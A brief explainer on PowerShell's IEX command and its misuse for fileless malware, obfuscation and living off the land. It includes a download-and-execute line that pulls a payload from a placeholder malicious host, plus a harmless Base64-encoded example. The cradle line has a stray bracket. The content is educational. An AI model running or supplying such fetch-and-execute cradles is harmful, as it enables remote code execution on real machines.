"IEX"
Reputation Proceeds it due to its ability to run code fetched from external (often untrusted) sources:
IEX ([[New-Object Net.WebClient]]).DownloadString('http://some.shady.site/payload.ps1')

This command is to be used sparingly, and only with trusted input.

**What does it do?**
- It takes a string and runs it as PowerShell code—sort of like eval() in many programming languages.

**Common Malicious Usage**
- **Fileless malware:** Attackers love to fetch evil code directly into memory—no file for antivirus to catch!
- **Obfuscation:** Crooks will Base64 encode payloads, then use `IEX` to decode and execute.
- **Living off the land:** Because `IEX` is built-in, it often flies under the radar if defenders aren’t vigilant.
Example:  IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2V0LXByb2Nlc3M=')))
